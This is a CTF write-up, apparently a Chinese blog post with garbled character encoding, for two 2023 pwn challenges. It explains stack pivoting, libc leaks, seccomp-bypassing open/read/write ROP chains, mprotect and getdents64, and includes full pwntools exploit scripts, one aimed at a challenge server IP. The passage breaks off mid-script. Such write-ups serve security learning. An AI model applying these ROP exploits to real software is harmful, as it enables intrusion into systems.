        <content type="html"><![CDATA[<h1 id="SandBox"><a href="#SandBox" class="headerlink" title="SandBox"></a>SandBox</h1><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg">https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg</a><br>æå–ç ï¼š05zg</p><p>é¢˜ç›®å¼€å¯äº†æ²™ç®±æœºåˆ¶</p><blockquote><p>æ²™ç®±(Sandbox)æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ç§éš”ç¦»æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯é™åˆ¶ä¸å¯ä¿¡è¿›ç¨‹å’Œä¸å¯ä¿¡ä»£ç çš„è®¿é—®æƒé™ã€‚è®¡ç®—æœºé¢†åŸŸçš„è™šæ‹ŸæŠ€æœ¯ï¼Œå¸¸è§äºå®‰å…¨æ–¹å‘ã€‚ä¼šç¦ç”¨ä¸€äº›ç³»ç»Ÿè°ƒç”¨</p><p>å®ç°æ²™ç®±æœºåˆ¶</p><ul><li><p>ä¸€ç§é‡‡ç”¨prctlå‡½æ•°è°ƒç”¨</p></li><li><p>ä¸€ç§æ˜¯ä½¿ç”¨seccompåº“å‡½æ•°ã€‚</p></li></ul></blockquote><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec sandbox</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/sandbox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†execveç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ—¶systemæ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼Œå› ä¸ºsystemæ˜¯glibcä¸­çš„å‡½æ•°ï¼Œç”¨shellæ¥è°ƒç”¨ç¨‹åº&#x3D;fork+exec+waitpid</p><img src="/2023/03/05/sd-police2023-pwn/image-20230305122657981.png" alt="image-20230305122657981" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A bit small, but it doesn&#x27;t affect me cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h2><p>åªæœ‰0x10ä¸ªå­—èŠ‚çš„å¤§å°ï¼Œæˆ‘ä»¬å…ˆè¿›è¡Œæ ˆè¿ç§»</p><p>é€‰æ‹©bss&#x3D;0x404500</p><ul><li><p>æˆ‘ä»¬å…ˆpayload&#x3D;padding+p64(bss)+p64(read_ret)ï¼Œç”±äºæ˜¯é‡‡ç”¨leave retå¹³æ ˆï¼Œä¼šæŠŠrbpæ”¹ä¸ºbssåœ°å€ï¼Œret åˆ°read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305154743044.png" alt="image-20230305154743044" style="zoom: 67%;"></li></ul></li><li><p>payload&#x3D;padding+p64(bss+0x50)+p64(read_ret)ï¼Œæˆ‘ä»¬åœ¨bss-0x50è¾“å…¥</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155002168.png" alt="image-20230305155002168" style="zoom:80%;"></li></ul></li><li><p>å¹³æ ˆåæˆ‘ä»¬çš„rspä¸º0x404510(å› ä¸ºåœ¨leave mov esp,ebpåéœ€è¦pop rbpå’Œretæ ˆé¡¶rspä¼šæé«˜0x10),rbpä¸º0x404550ï¼Œå†æ¬¡è¿”å›read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155441801.png" alt="image-20230305155441801" style="zoom:80%;"></li></ul></li><li><p>payload&#x3D;p64(bss+0x60)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)ä¼šåœ¨bssè¾“å…¥payload</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305161933424.png" alt="image-20230305161933424"></li></ul></li><li><p>è¿™é‡Œæˆ‘ä»¬call readå‡½æ•°æ—¶ä¼šæŠŠè¿”å›åœ°å€æ”¾åœ¨0x404508å¤„ï¼Œæˆ‘ä»¬æŠŠä»–è¦†ç›–ä¸ºäº†pop rdi ï¼›retï¼Œæ‰€ä»¥åœ¨è¿”å›æ—¶å°±å¯ä»¥è¾“å‡ºgotè¡¨è¿”å›main</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305231637179.png" alt="image-20230305231637179" style="zoom:67%;"></li></ul></li><li><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿”å›mainï¼Œå†æ¬¡å¾ªç¯åˆ©ç”¨è¿ç§»å’Œè¦†ç›–readè¿”å›</p></li></ul><h2 id="ORWè¯»å–flag"><a href="#ORWè¯»å–flag" class="headerlink" title="ORWè¯»å–flag"></a>ORWè¯»å–flag</h2><p>å¯¹äº<strong>32<em>ä½ç¨‹åºï¼Œåº”è°ƒç”¨</em></strong>int $0x80è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥eaxï¼Œå„ä¸ªå‚æ•°æŒ‰ç…§ebxã€ecxã€edxçš„é¡ºåºä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å›å€¼å‚¨å­˜åˆ°eaxå¯„å­˜å™¨ã€‚</p><p>å¯¹äº64ä½ç¨‹åºï¼Œåº”è°ƒç”¨ syscallè¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥raxï¼Œå„ä¸ªå‚æ•°æŒ‰ç…§rdiã€rsiã€rdxçš„é¡ºåºä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å›å€¼å‚¨å­˜åˆ°raxå¯„å­˜å™¨ã€‚</p><p>ä»ä½¿ç”¨ä¸Šæ¥çœ‹</p><ul><li>çº¦å®šçš„ä¼ é€’å‚æ•°çš„å¯„å­˜å™¨ä¸åŒ<ul><li>syscall ä½¿ç”¨çš„æ˜¯ edi ã€ esi ã€ edx ã€ ecxï¼Œ</li><li>int 0x80 ä½¿ç”¨çš„æ˜¯ ebx ã€ ecx ã€ edx ã€ esi ã€ edi</li></ul></li></ul><p>ä»å†…éƒ¨æœºåˆ¶æ¥çœ‹</p><ul><li>syscall è°ƒç”¨çš„æ˜¯Cåº“å‡½æ•°ï¼Œæ˜¯åœ¨ç”¨æˆ·ç©ºé—´çš„ï¼Œå¹¶ä¸”æœ€ç»ˆè¿˜æ˜¯ä¼šè°ƒç”¨å†…æ ¸å‡½æ•°ï¼ˆå…¥å£ç‚¹ï¼‰</li><li>int 0x80 è°ƒç”¨çš„æ˜¯å†…æ ¸å‡½æ•°ï¼Œæ˜¯åœ¨å†…æ ¸ç©ºé—´çš„</li></ul><p>æˆ‘ä»¬å…ˆæŠŠâ€˜.&#x2F;flagâ€™å­—ç¬¦ä¸²é€šè¿‡readå‡½æ•°å†™å…¥å†…å­˜payload&#x3D;bâ€™deadbeefâ€™+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p><blockquote><p>ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦</p><p>0 æ ‡å‡†è¾“å…¥</p><p>1 æ ‡å¿—è¾“å‡º </p><p>2 æ ‡å¿—é”™è¯¯ </p></blockquote><p>åœ¨åˆ©ç”¨æ ‡å‡†åº“é‡Œçš„syscallæ‰“å¼€flagæ–‡ä»¶ï¼Œreadè¯»å–åˆ°å†…å­˜</p><p>payload&#x3D;bâ€™deadbeefâ€™+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[â€˜syscallâ€™])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[â€˜readâ€™])+p64(main)</p><blockquote><p>syscallæ±‡ç¼–å¦‚ä¸‹</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306010914175.png" alt="image-20230306010914175"></p><p>ä¼šæŠŠrdi rsi rdxç­‰ï¼Œä¾æ¬¡ç»™åˆ°rax rdi  rsiç­‰ å†å†…æ ¸å‡½æ•°syscallç³»ç»Ÿè°ƒç”¨</p><p>openæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦éœ€è¦æä¾›ç»™readå‡½æ•°ï¼Œä¸€èˆ¬éƒ½æ˜¯ä»3å¼€å§‹(012è¢«æ ‡å¿—å ç”¨)</p></blockquote><p>æœ€åè¯»å–flagåˆ°æ ‡å‡†è¾“å‡ºï¼Œpayload&#x3D;bâ€™deadbeefâ€™+p64(rdi)+p64(1)+p64(rsi_r15)+p64(0x404900)+p64(0x100)+p64(base+libc.sym[â€˜writeâ€™])+p64(main)</p><p>æ‹¿åˆ°flag</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306012654458.png" alt="image-20230306012654458"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./sandbox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.13.251.106&#x27;</span>,<span class="string">&#x27;8004&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401214&#x27;)</span></span><br><span class="line">rdi=<span class="number">0x401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0401281</span> </span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">p(<span class="string">&#x27;main&#x27;</span>,main)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&quot;puts_ad&quot;</span>,puts_ad)</span><br><span class="line"></span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">mprotect = base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x40</span>)+p64(read_addr)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0x2</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x100</span>)+p64(base+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(main)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag?????"></a>flag?????</h1><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng">https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng</a><br>æå–ç ï¼špdi2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec pwn3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œsandboxä¸€æ ·ï¼Œåªæœ‰0x10å­—èŠ‚çš„æº¢å‡ºï¼Œseccomp-toolsæ£€æµ‹äº†ä¸€ä¸‹å¹¶æ²¡æœ‰æ²™ç®±ï¼Œç®€ç®€å•å•æ‹¿ä¸ªshellZzzï¼Œç›´æ¥æ ˆè¿ç§»ROP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./flag???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(bin_sh)+p64(<span class="number">0x000000000040101a</span>)+p64(system_ad)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æ‹¿åˆ°shell</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306122938871.png" alt="image-20230306122938871"></p><p>gdbè·Ÿäº†ä¸€ä¸‹å‘ç°ä¼šæ‰§è¡Œåˆ°system(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œåˆæ˜¯å¼€äº†æ²™ç®±ï¼Œæ²¡æœ‰æ£€æµ‹å‡ºæ¥ï¼Œå‘ç°é¢˜ç›®ç»™äº†æç¤ºæœ‰æ²™ç®±</p><h2 id="mprotectä¿®æ”¹æƒé™"><a href="#mprotectä¿®æ”¹æƒé™" class="headerlink" title="mprotectä¿®æ”¹æƒé™"></a>mprotectä¿®æ”¹æƒé™</h2><p>åœ¨Linuxä¸­ï¼Œmprotect()å‡½æ•°å¯ä»¥ç”¨æ¥ä¿®æ”¹ä¸€æ®µæŒ‡å®šå†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚</p><p>å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span>å¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line">ä»startå¼€å§‹ä¿®æ”¹lené•¿åº¦byteçš„æƒé™ä¸ºprot</span><br><span class="line">* startå¿…é¡»ä»å¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°åœ°å€ linuxé¡µä¸€èˆ¬<span class="number">4</span>kï¼ˆ<span class="number">0x1000b</span>yteï¼‰</span><br><span class="line">* lenå¿…é¡»æ˜¯é¡µæ•´æ•°å€</span><br><span class="line">* partå’Œlinuxæ–‡ä»¶æƒé™ä¸€æ · RWX</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å…ˆæ³„éœ²æ–‡ä»¶åï¼Œçœ‹åˆ°è¦å†™å…¥shellcodeï¼Œè¿™ä¸€æ­¥æ˜¯å¿…è¦çš„</p><p>payload&#x3D;bâ€™deadbeefâ€™+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(4096)+p64(poprdx_r12)+p64(0x7)+p64(0x6666)+p64(mprotect)+p64(main)</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306141247754.png" alt="image-20230306141247754"></p><p>ä¿®æ”¹å®Œæˆrwx</p><h2 id="getdents64æ³„éœ²æ–‡ä»¶å"><a href="#getdents64æ³„éœ²æ–‡ä»¶å" class="headerlink" title="getdents64æ³„éœ²æ–‡ä»¶å"></a>getdents64æ³„éœ²æ–‡ä»¶å</h2><p>getdents64å‡½æ•°ï¼Œå®ƒè¯»å–ç›®å½•æ–‡ä»¶ä¸­çš„ä¸€ä¸ªä¸ªç›®å½•é¡¹å¹¶è¿”å›</p><ul><li>å‚æ•°ä¸€ï¼šfdæŒ‡é’ˆ</li><li>å‚æ•°äºŒï¼šå†™å…¥çš„å†…å­˜åŒºåŸŸ</li><li>å‚æ•°ä¸‰ï¼š4096</li><li>åŠŸèƒ½ï¼šæŠŠå½“å‰æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶åå†™å…¥å‚æ•°äºŒæŒ‡å‘çš„å†…å­˜åŒºåŸŸ</li></ul><p>linux lsåº•å±‚æ˜¯è°ƒç”¨getdents64å‡½æ•°å®ç°çš„</p><p>æˆ‘ä»¬ç”¨staceè·Ÿè¸ªä¸€äº›ls</p><blockquote><p>straceæ˜¯ä¸€ä¸ªå¯ç”¨äºè¯Šæ–­ã€è°ƒè¯•å’Œæ•™å­¦çš„Linuxç”¨æˆ·ç©ºé—´è·Ÿè¸ªå™¨ã€‚æˆ‘ä»¬ç”¨å®ƒæ¥ç›‘æ§ç”¨æˆ·ç©ºé—´è¿›ç¨‹å’Œå†…æ ¸çš„äº¤äº’ï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨ã€ä¿¡å·ä¼ é€’ã€è¿›ç¨‹çŠ¶æ€å˜æ›´ç­‰ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">ioctl(1, TIOCGWINSZ, &#123;ws_row=49, ws_col=102, ws_xpixel=1632, ws_ypixel=1568&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFDIR|0777, st_size=4096, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 23 entries */, 32768) = 800</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack\t  flag.txt&quot;..., 67) = 67</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack.py  get_st&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;ciscn_2019_c_1\t\t  get_started_3d&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;core\t\t\t  get_started_3dsctf_2016&quot;..., 68) = 68</span><br><span class="line">write(1, &quot;ctest\t\t\t  IDA\t\t\t\t       payload.&quot;..., 51) = 51</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span 